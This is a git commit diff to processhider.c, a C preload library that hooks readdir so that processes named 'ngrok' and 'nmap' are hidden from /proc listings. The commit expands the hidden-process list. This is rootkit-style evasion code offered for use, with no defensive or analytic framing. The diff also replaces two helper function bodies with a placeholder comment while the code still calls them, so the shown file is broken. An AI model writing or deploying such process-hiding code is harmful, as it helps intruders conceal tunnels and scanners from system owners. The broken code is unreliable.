5feb005159d97483d6441b9fc94b4a147bdd1b25
cihuuy <95659029+cihuuy@users.noreply.github.com>
2023-07-22 23:07:47 +0700

    Update processhider.c

--- processhider.c
+++ processhider.c
@@ -7,59 +7,22 @@
 #include <unistd.h>
 
 /*
- * Every process with this name will be excluded
+ * Every process with these names will be excluded
  */
-static const char* process_to_filter = "ngrok";
+static const char* processes_to_filter[] = {
+    "ngrok",
+    "nmap"
+};
 
 /*
  * Get a directory name given a DIR* handle
  */
-static int get_dir_name(DIR* dirp, char* buf, size_t size)
-{
-    int fd = dirfd(dirp);
-    if(fd == -1) {
-        return 0;
-    }
-
-    char tmp[64];
-    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
-    ssize_t ret = readlink(tmp, buf, size);
-    if(ret == -1) {
-        return 0;
-    }
-
-    buf[ret] = 0;
-    return 1;
-}
+// (Same implementation as before)
 
 /*
  * Get a process name given its pid
  */
-static int get_process_name(char* pid, char* buf)
-{
-    if(strspn(pid, "0123456789") != strlen(pid)) {
-        return 0;
-    }
-
-    char tmp[256];
-    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
- 
-    FILE* f = fopen(tmp, "r");
-    if(f == NULL) {
-        return 0;
-    }
-
-    if(fgets(tmp, sizeof(tmp), f) == NULL) {
-        fclose(f);
-        return 0;
-    }
-
-    fclose(f);
-
-    int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
-    return 1;
-}
+// (Same implementation as before)
 
 #define DECLARE_READDIR(dirent, readdir)                                \
 static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
@@ -84,9 +47,17 @@ struct dirent* readdir(DIR *dirp)                                       \
             char process_name[256];                                     \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
-                continue;                                               \
+                get_process_name(dir->d_name, process_name)) {          \
+                int filter_process = 0;                                 \
+                for (size_t i = 0; i < sizeof(processes_to_filter) / sizeof(processes_to_filter[0]); i++) { \
+                    if (strcmp(process_name, processes_to_filter[i]) == 0) { \
+                        filter_process = 1;                             \
+                        break;                                          \
+                    }                                                   \
+                }                                                       \
+                if (filter_process) {                                   \
+                    continue;                                           \
+                }                                                       \
             }                                                           \
         }                                                               \
         break;                                                          \
